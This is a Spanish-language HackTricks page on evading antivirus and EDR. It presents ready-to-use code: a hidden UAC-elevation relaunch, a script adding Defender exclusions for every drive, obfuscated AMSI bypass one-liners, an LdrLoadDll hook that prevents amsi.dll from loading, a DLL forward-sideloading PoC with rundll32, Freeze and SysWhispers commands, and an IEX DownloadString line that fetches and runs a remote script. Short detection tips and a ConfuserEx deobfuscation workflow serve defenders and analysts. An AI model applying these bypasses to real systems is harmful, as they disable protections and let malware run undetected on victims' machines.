# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**¡Esta página fue escrita inicialmente por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Una herramienta para detener el funcionamiento de Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Una herramienta para detener el funcionamiento de Windows Defender simulando otro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Sugerencia de UAC al estilo instalador antes de manipular Defender

Los loaders públicos que se hacen pasar por cheats de juegos suelen distribuirse como instaladores unsigned de Node.js/Nexe que primero **piden al usuario elevación** y solo después neutralizan Defender. El flujo es simple:

1. Comprobar si hay contexto administrativo con `net session`. El comando solo tiene éxito cuando quien lo invoca tiene privilegios de admin, así que un fallo indica que el loader se está ejecutando como usuario estándar.
2. Relanzarse inmediatamente con el verbo `RunAs` para activar el prompt de consentimiento UAC esperado mientras se preserva la línea de comandos original.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Las víctimas ya creen que están instalando software “cracked”, así que el prompt suele aceptarse, dando al malware los derechos que necesita para cambiar la policy de Defender.

### Blanket `MpPreference` exclusions for every drive letter

Una vez elevado, las cadenas estilo GachiLoader maximizan los puntos ciegos de Defender en lugar de deshabilitar el servicio por completo. El loader primero mata el GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) y luego aplica **exclusiones extremadamente amplias** para que cada perfil de usuario, directorio del sistema y disco extraíble quede sin escanear:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Observaciones clave:

- El bucle recorre todos los sistemas de archivos montados (D:\, E:\, USB sticks, etc.), así que **cualquier payload futuro soltado en cualquier lugar del disco se ignora**.
- La exclusión de la extensión `.sys` es a futuro: los atacantes reservan la opción de cargar drivers sin firmar más tarde sin tocar Defender otra vez.
- Todos los cambios quedan bajo `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, lo que permite que fases posteriores confirmen que las exclusiones persisten o las amplíen sin volver a disparar UAC.

Como no se detiene ningún servicio de Defender, las comprobaciones de estado ingenuas siguen reportando “antivirus activo” aunque la inspección en tiempo real nunca toque esas rutas.

## **AV Evasion Methodology**

Actualmente, los AVs usan diferentes métodos para comprobar si un archivo es malicioso o no: static detection, dynamic analysis y, para los EDRs más avanzados, behavioural analysis.

### **Static detection**

La static detection se logra marcando cadenas o arrays de bytes conocidos como maliciosos en un binario o script, y también extrayendo información del propio archivo (p. ej., file description, company name, digital signatures, icon, checksum, etc.). Esto significa que usar herramientas públicas conocidas puede hacer que te pillen más fácilmente, ya que probablemente ya hayan sido analizadas y marcadas como maliciosas. Hay un par de formas de esquivar este tipo de detection:

- **Encryption**

Si encryptas el binario, no habrá forma de que el AV detecte tu programa, pero necesitarás algún tipo de loader para decrypt y ejecutar el programa en memory.

- **Obfuscation**

A veces lo único que necesitas es cambiar algunas strings en tu binario o script para que pase el AV, pero puede ser una tarea que consume mucho tiempo dependiendo de lo que estés intentando obfuscate.

- **Custom tooling**

Si desarrollas tus propias tools, no habrá known bad signatures, pero esto requiere mucho tiempo y esfuerzo.

> [!TIP]
> Una buena forma de comprobar la static detection de Windows Defender es [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Básicamente divide el archivo en múltiples segmentos y luego le pide a Defender que escanee cada uno individualmente; de este modo, puede decirte exactamente cuáles son las strings o bytes marcados en tu binario.

Te recomiendo mucho que mires esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion práctica.

### **Dynamic analysis**

La dynamic analysis es cuando el AV ejecuta tu binario en un sandbox y observa actividad maliciosa (p. ej., intentar decrypt y leer las passwords de tu browser, hacer un minidump de LSASS, etc.). Esta parte puede ser un poco más difícil de manejar, pero aquí tienes algunas cosas que puedes hacer para evadir sandboxes.

- **Sleep before execution** Dependiendo de cómo esté implementado, puede ser una gran forma de bypass la dynamic analysis del AV. Los AVs tienen muy poco tiempo para escanear archivos y no interrumpir el flujo de trabajo del usuario, así que usar sleeps largos puede dificultar el análisis de binarios. El problema es que muchos sandboxes de AVs pueden simplemente saltarse el sleep dependiendo de cómo esté implementado.
- **Checking machine's resources** Normalmente los Sandboxes tienen muy pocos recursos con los que trabajar (p. ej. < 2GB RAM), de lo contrario podrían ralentizar la máquina del usuario. Aquí también puedes ser muy creativo, por ejemplo comprobando la temperatura de la CPU o incluso la velocidad de los ventiladores; no todo estará implementado en el sandbox.
- **Machine-specific checks** Si quieres apuntar a un usuario cuyo workstation está unido al dominio "contoso.local", puedes hacer una comprobación del domain del equipo para ver si coincide con el que has especificado; si no coincide, puedes hacer que tu programa salga.

Resulta que el nombre del ordenador del Sandbox de Microsoft Defender es HAL9TH, así que puedes comprobar el computer name en tu malware antes de la detonación; si el nombre coincide con HAL9TH, significa que estás dentro del sandbox de Defender, así que puedes hacer que tu programa salga.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Otros consejos muy buenos de [@mgeeky](https://twitter.com/mariuszbit) para ir contra Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Como hemos dicho antes en este post, **public tools** acabarán **siendo detectadas**, así que deberías preguntarte algo:

Por ejemplo, si quieres volcar LSASS, **¿de verdad necesitas usar mimikatz**? ¿O podrías usar un proyecto diferente, menos conocido y que también vuelque LSASS?

La respuesta correcta probablemente sea la segunda. Tomando mimikatz como ejemplo, probablemente sea una de las piezas de malware más marcadas por AVs y EDRs, si no la que más; aunque el proyecto en sí es super cool, también es una pesadilla trabajar con él para esquivar AVs, así que busca alternativas para lo que quieras lograr.

> [!TIP]
> Cuando modifiques tus payloads para evasion, asegúrate de **desactivar automatic sample submission** en defender, y por favor, en serio, **NO LO SUBAS A VIRUSTOTAL** si tu objetivo es lograr evasion a largo plazo. Si quieres comprobar si tu payload es detectado por un AV concreto, instálalo en una VM, intenta desactivar el automatic sample submission y pruébalo allí hasta que estés satisfecho con el resultado.

## EXEs vs DLLs

Siempre que sea posible, **prioriza usar DLLs para evasion**; en mi experiencia, los archivos DLL suelen estar **mucho menos detectados** y analizados, así que es un truco muy simple para evitar la detection en algunos casos (si tu payload tiene alguna forma de ejecutarse como DLL, claro).

Como podemos ver en esta imagen, un DLL Payload de Havoc tiene una tasa de detection de 4/26 en antiscan.me, mientras que el payload EXE tiene una tasa de detection de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparación en antiscan.me de un payload Havoc EXE normal frente a un Havoc DLL normal</p></figcaption></figure>

Ahora mostraremos algunos trucos que puedes usar con archivos DLL para ser mucho más stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** aprovecha el orden de búsqueda de DLLs usado por el loader al colocar tanto la aplicación víctima como el payload malicioso uno junto al otro.

Puedes comprobar qué programas son susceptibles a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) y el siguiente script de powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando mostrará la lista de programas susceptibles a DLL hijacking dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Te recomiendo mucho **explorar por ti mismo programas DLL Hijackable/Sideloadable**, esta técnica es bastante sigilosa si se hace correctamente, pero si usas programas DLL Sideloadable de conocimiento público, puedes ser atrapado fácilmente.

Solo con colocar una DLL maliciosa con el nombre que un programa espera cargar, no se cargará tu payload, ya que el programa espera algunas funciones específicas dentro de esa DLL; para solucionar este problema, usaremos otra técnica llamada **DLL Proxying/Forwarding**.

**DLL Proxying** reenvía las llamadas que un programa hace desde la DLL proxy (y maliciosa) a la DLL original, preservando así la funcionalidad del programa y pudiendo gestionar la ejecución de tu payload.

Usaré el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estos son los pasos que seguí:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
El último comando nos dará 2 archivos: una plantilla de código fuente DLL y la DLL original renombrada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Estos son los resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como el proxy DLL tienen una tasa de detección de 0/26 en [antiscan.me](https://antiscan.me)! Yo lo llamaría un éxito.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Recomiendo encarecidamente** que veas el VOD de Twitch de [S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading y también el [video de ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender más sobre lo que hemos comentado con más detalle.

### Abusing Forwarded Exports (ForwardSideLoading)

Los módulos Windows PE pueden exportar funciones que en realidad son "forwarders": en lugar de apuntar a código, la entrada de exportación contiene una cadena ASCII del formulario `TargetDll.TargetFunc`. Cuando un caller resuelve la exportación, el Windows loader hará lo siguiente:

- Cargar `TargetDll` si aún no está cargado
- Resolver `TargetFunc` desde él

Comportamientos clave que hay que entender:
- Si `TargetDll` es un KnownDLL, se suministra desde el namespace protegido de KnownDLLs (por ejemplo, ntdll, kernelbase, ole32).
- Si `TargetDll` no es un KnownDLL, se usa el orden normal de búsqueda de DLL, que incluye el directorio del módulo que está haciendo la resolución del forward.

Esto habilita un primitive indirecto de sideloading: encuentra una DLL firmada que exporte una función forwardeada a un nombre de módulo que no sea KnownDLL, luego coloca esa DLL firmada junto con una DLL controlada por el atacante nombrada exactamente como el módulo de destino forwardeado. Cuando se invoque la exportación forwardeada, el loader resuelve el forward y carga tu DLL desde el mismo directorio, ejecutando tu DllMain.

Ejemplo observado en Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` no es un KnownDLL, así que se resuelve mediante el orden de búsqueda normal.

PoC (copiar y pegar):
1) Copia la DLL del sistema firmada a una carpeta con permisos de escritura
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloca un `NCRYPTPROV.dll` malicioso en la misma carpeta. Un `DllMain` mínimo es suficiente para obtener ejecución de código; no necesitas implementar la función reenviada para activar `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Activar el forward con un LOLBin firmado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamiento observado:
- rundll32 (firmado) carga el side-by-side `keyiso.dll` (firmado)
- Mientras resuelve `KeyIsoSetAuditingInterface`, el loader sigue el forward a `NCRYPTPROV.SetAuditingInterface`
- Luego el loader carga `NCRYPTPROV.dll` desde `C:\test` y ejecuta su `DllMain`
- Si `SetAuditingInterface` no está implementada, obtendrás un error de "missing API" solo después de que `DllMain` ya se haya ejecutado

Consejos de hunting:
- Enfócate en forwarded exports donde el módulo objetivo no sea un KnownDLL. Los KnownDLLs se enumeran bajo `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puedes enumerar forwarded exports con tooling como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulte el inventario de forwarders de Windows 11 para buscar candidatos: https://hexacorn.com/d/apis_fwd.txt

Ideas de detección/defensa:
- Monitoriza LOLBins (p. ej., rundll32.exe) cargando DLLs firmadas desde rutas que no son del sistema, seguidas de la carga de non-KnownDLLs con el mismo nombre base desde ese directorio
- Genera alertas sobre cadenas de proceso/módulo como: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` bajo rutas en las que el usuario puede escribir
- Aplica políticas de integridad de código (WDAC/AppLocker) y deniega write+execute en directorios de aplicaciones

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puedes usar Freeze para cargar y ejecutar tu shellcode de forma sigilosa.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion es solo un juego de gato y ratón, lo que funciona hoy podría ser detectado mañana, así que nunca dependas de una sola herramienta; si es posible, intenta encadenar múltiples técnicas de evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Los EDRs a menudo colocan **user-mode inline hooks** en los syscall stubs de `ntdll.dll`. Para evitar esos hooks, puedes generar syscall stubs **direct** o **indirect** que carguen el **SSN** correcto (System Service Number) y transicionen a kernel mode sin ejecutar el hooked export entrypoint.

**Opciones de invocación:**
- **Direct (embedded)**: emite una instrucción `syscall`/`sysenter`/`SVC #0` en el stub generado (sin hit al export de `ntdll`).
- **Indirect**: salta a un gadget `syscall` existente dentro de `ntdll` para que la transición al kernel parezca originarse en `ntdll` (útil para evasion heurística); **randomized indirect** elige un gadget de un pool por llamada.
- **Egg-hunt**: evita incrustar la secuencia estática `0F 05` opcode en disco; resuelve una secuencia de syscall en runtime.

**Estrategias de resolución de SSN resistentes a hooks:**
- **FreshyCalls (VA sort)**: infiere los SSN ordenando los syscall stubs por virtual address en lugar de leer los bytes del stub.
- **SyscallsFromDisk**: monta un `\KnownDlls\ntdll.dll` limpio, lee los SSN desde su `.text`, y luego desmonta (evita todos los hooks en memoria).
- **RecycledGate**: combina inferencia de SSN ordenada por VA con validación de opcode cuando un stub está limpio; hace fallback a inferencia por VA si está hooked.
- **HW Breakpoint**: configura DR0 en la instrucción `syscall` y usa un VEH para capturar el SSN desde `EAX` en runtime, sin analizar bytes hooked.

Ejemplo de uso de SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI fue creado para prevenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, los AV solo podían escanear **archivos en disco**, así que si de alguna manera podías ejecutar payloads **directamente en memoria**, el AV no podía hacer nada para impedirlo, ya que no tenía suficiente visibilidad.

La funcionalidad AMSI está integrada en estos componentes de Windows.

- User Account Control, o UAC (elevación de EXE, COM, MSI, o instalación de ActiveX)
- PowerShell (scripts, uso interactivo y evaluación dinámica de código)
- Windows Script Host (wscript.exe y cscript.exe)
- JavaScript y VBScript
- Macros VBA de Office

Permite que las soluciones antivirus inspeccionen el comportamiento de los scripts exponiendo su contenido de una forma que no está cifrada ni ofuscada.

Ejecutar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` producirá la siguiente alerta en Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Observa cómo antepone `amsi:` y luego la ruta al ejecutable desde el cual se ejecutó el script, en este caso, powershell.exe

No dejamos caer ningún archivo en disco, pero aun así fuimos detectados en memoria por AMSI.

Además, a partir de **.NET 4.8**, el código C# también se ejecuta a través de AMSI. Esto incluso afecta a `Assembly.Load(byte[])` para cargar ejecución en memoria. Por eso se recomienda usar versiones inferiores de .NET (como 4.7.2 o inferiores) para la ejecución en memoria si quieres evadir AMSI.

Hay un par de formas de sortear AMSI:

- **Obfuscation**

Como AMSI funciona principalmente con detecciones estáticas, modificar los scripts que intentas cargar puede ser una buena forma de evadir la detección.

Sin embargo, AMSI tiene la capacidad de desofuscar scripts incluso si tienen múltiples capas, por lo que la ofuscación podría ser una mala opción dependiendo de cómo se haga. Esto hace que no sea tan sencillo evadirlo. Aunque, a veces, todo lo que necesitas hacer es cambiar un par de nombres de variables y estarás bien, así que depende de cuánto haya sido marcado algo.

- **AMSI Bypass**

Como AMSI está implementado cargando una DLL en el proceso de powershell (también cscript.exe, wscript.exe, etc.), es posible modificarlo fácilmente incluso ejecutándose como un usuario sin privilegios. Debido a esta falla en la implementación de AMSI, los investigadores han encontrado múltiples formas de evadir el escaneo de AMSI.

**Forcing an Error**

Forzar que falle la inicialización de AMSI (amsiInitFailed) hará que no se inicie ningún escaneo para el proceso actual. Originalmente esto fue divulgado por [Matt Graeber](https://twitter.com/mattifestation) y Microsoft ha desarrollado una firma para impedir un uso más amplio.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Todo lo que hizo falta fue una línea de código de powershell para dejar AMSI inutilizable para el proceso actual de powershell. Esta línea, por supuesto, ha sido marcada por el propio AMSI, así que se necesita alguna modificación para poder usar esta técnica.

Aquí hay un bypass de AMSI modificado que tomé de este [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Ten en cuenta que probablemente esto será detectado una vez que salga esta publicación, así que no deberías publicar ningún código si tu plan es permanecer sin ser detectado.

**Memory Patching**

Esta técnica fue descubierta inicialmente por [@RastaMouse](https://twitter.com/_RastaMouse/) y consiste en encontrar la dirección de la función "AmsiScanBuffer" en amsi.dll (responsable de escanear la entrada proporcionada por el usuario) y sobrescribirla con instrucciones para devolver el código de E_INVALIDARG; de esta manera, el resultado del escaneo real devolverá 0, que se interpreta como un resultado limpio.

> [!TIP]
> Por favor, lee [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para una explicación más detallada.

También hay muchas otras técnicas usadas para bypass AMSI con powershell, consulta [**esta página**](basic-powershell-for-pentesters/index.html#amsi-bypass) y [**este repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para aprender más sobre ellas.

### Bloqueando AMSI al impedir la carga de amsi.dll (LdrLoadDll hook)

AMSI se inicializa solo después de que `amsi.dll` se carga en el proceso actual. Un bypass robusto y agnóstico al lenguaje consiste en colocar un hook en modo usuario sobre `ntdll!LdrLoadDll` que devuelva un error cuando el módulo solicitado sea `amsi.dll`. Como resultado, AMSI nunca se carga y no ocurren escaneos para ese proceso.

Esquema de implementación (pseudocódigo x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona en PowerShell, WScript/CScript y custom loaders por igual (cualquier cosa que de otro modo cargaría AMSI).
- Combínalo con pasar scripts por stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefactos largos en la línea de comandos.
- Se ha visto usado por loaders ejecutados a través de LOLBins (por ejemplo, `regsvr32` llamando a `DllRegisterServer`).

La herramienta **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** también genera script para bypass AMSI.
La herramienta **[https://amsibypass.com/](https://amsibypass.com/)** también genera script para bypass AMSI que evita la signature mediante una user-defined function, variables, characters expression aleatorizadas y aplica mayúsculas y minúsculas aleatorias a las palabras clave de PowerShell para evitar la signature.

**Remove the detected signature**

Puedes usar una herramienta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** y **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para eliminar la AMSI signature detectada de la memoria del proceso actual. Esta herramienta funciona escaneando la memoria del proceso actual en busca de la AMSI signature y luego sobrescribiéndola con instrucciones NOP, eliminándola efectivamente de la memoria.

**AV/EDR products that uses AMSI**

Puedes encontrar una lista de productos AV/EDR que usan AMSI en **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Si usas PowerShell versión 2, AMSI no se cargará, así que puedes ejecutar tus scripts sin que AMSI los analice. Puedes hacer esto:
```bash
powershell.exe -version 2
```
## PS Logging

El logging de PowerShell es una funcionalidad que permite registrar todos los comandos de PowerShell ejecutados en un sistema. Esto puede ser útil para auditoría y resolución de problemas, pero también puede ser un **problema para los atacantes que quieren evadir la detección**.

Para bypass PowerShell logging, puedes usar las siguientes técnicas:

- **Deshabilitar PowerShell Transcription y Module Logging**: Puedes usar una herramienta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para este propósito.
- **Usar Powershell version 2**: Si usas PowerShell version 2, AMSI no se cargará, así que puedes ejecutar tus scripts sin ser escaneado por AMSI. Puedes hacer esto: `powershell.exe -version 2`
- **Usar una sesión de Powershell no administrada**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para lanzar un powershell sin defensas (esto es lo que usa `powerpick` de Cobal Strike).


## Obfuscation

> [!TIP]
> Varias técnicas de obfuscation dependen de cifrar datos, lo que aumentará la entropía del binario y hará más fácil que AVs y EDRs lo detecten. Ten cuidado con esto y quizá aplica cifrado solo a secciones específicas de tu código que sean sensibles o necesiten ocultarse.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Cuando analizas malware que usa ConfuserEx 2 (o forks comerciales) es común encontrarse con varias capas de protección que bloquearán decompilers y sandboxes. El flujo de trabajo de abajo **restaura de forma fiable un IL casi–original** que después puede ser decompilado a C# en herramientas como dnSpy o ILSpy.

1.  Eliminación de anti-tampering – ConfuserEx cifra cada *method body* y la descifra dentro del constructor estático de *module* (`<Module>.cctor`). Esto también parchea el checksum del PE, así que cualquier modificación hará que el binario falle. Usa **AntiTamperKiller** para localizar las tablas de metadata cifradas, recuperar las claves XOR y reescribir un assembly limpio:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La salida contiene los 6 parámetros anti-tamper (`key0-key3`, `nameHash`, `internKey`) que pueden ser útiles al construir tu propio unpacker.

2.  Recuperación de símbolos / control flow – pasa el archivo *clean* a **de4dot-cex** (un fork de de4dot compatible con ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – selecciona el perfil de ConfuserEx 2
• de4dot deshará el flattening del control flow, restaurará los namespaces, classes y nombres de variables originales y descifrará las cadenas constantes.

3.  Eliminación de proxy-calls – ConfuserEx reemplaza las llamadas directas a métodos por wrappers ligeros (también llamados *proxy calls*) para romper aún más la decompilación. Elimínalos con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Después de este paso deberías observar APIs normales de .NET como `Convert.FromBase64String` o `AES.Create()` en lugar de funciones wrapper opacas (`Class8.smethod_10`, …).

4.  Limpieza manual – ejecuta el binario resultante en dnSpy, busca blobs grandes de Base64 o el uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar el *real* payload. A menudo el malware lo almacena como un byte array codificado en TLV inicializado dentro de `<Module>.byte_0`.

La cadena anterior restaura el flujo de ejecución **sin** necesidad de ejecutar la muestra maliciosa – útil cuando trabajas en una workstation offline.

> 🛈  ConfuserEx produce un atributo personalizado llamado `ConfusedByAttribute` que puede usarse como un IOC para clasificar muestras automáticamente.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: ofuscador de C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar un fork de código abierto de la suite de compilación [LLVM](http://www.llvm.org/) capaz de ofrecer mayor seguridad de software mediante [ofuscación de código](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) y protección ضد manipulación.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo usar el lenguaje `C++11/14` para generar, en tiempo de compilación, código ofuscado sin usar ninguna herramienta externa y sin modificar el compilador.
- [**obfy**](https://github.com/fritzone/obfy): Añade una capa de operaciones ofuscadas generadas por el framework de metaprogramación de plantillas de C++ que hará la vida de la persona que quiera crackear la aplicación un poco más difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un ofuscador binario x64 que es capaz de ofuscar varios archivos pe diferentes, incluyendo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame es un motor simple de código metamórfico para ejecutables arbitrarios.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un framework de ofuscación de código de grano fino para lenguajes soportados por LLVM usando ROP (return-oriented programming). ROPfuscator ofusca un programa a nivel de código ensamblador transformando instrucciones normales en cadenas ROP, frustrando nuestra concepción natural del flujo de control normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt es un Crypter de PE de .NET escrito en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor es capaz de convertir EXE/DLL existentes en shellcode y luego cargarlos

## SmartScreen & MoTW

Puede que hayas visto esta pantalla al descargar algunos ejecutables de internet y ejecutarlos.

Microsoft Defender SmartScreen es un mecanismo de seguridad diseñado para proteger al usuario final contra la ejecución de aplicaciones potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente con un enfoque basado en reputación, lo que significa que las aplicaciones descargadas de forma poco común activarán SmartScreen, alertando e impidiendo que el usuario final ejecute el archivo (aunque el archivo todavía puede ejecutarse haciendo clic en More Info -> Run anyway).

**MoTW** (Mark of The Web) es un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con el nombre Zone.Identifier que se crea automáticamente al descargar archivos de internet, junto con la URL desde la que se descargaron.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Comprobando el ADS Zone.Identifier de un archivo descargado de internet.</p></figcaption></figure>

> [!TIP]
> Es importante señalar que los ejecutables firmados con un certificado de firma **de confianza** **no activarán SmartScreen**.

Una forma muy eficaz de evitar que tus payloads obtengan el Mark of The Web es empaquetándolos dentro de algún tipo de contenedor como un ISO. Esto ocurre porque Mark-of-the-Web (MOTW) **no puede** aplicarse a volúmenes **no NTFS**.

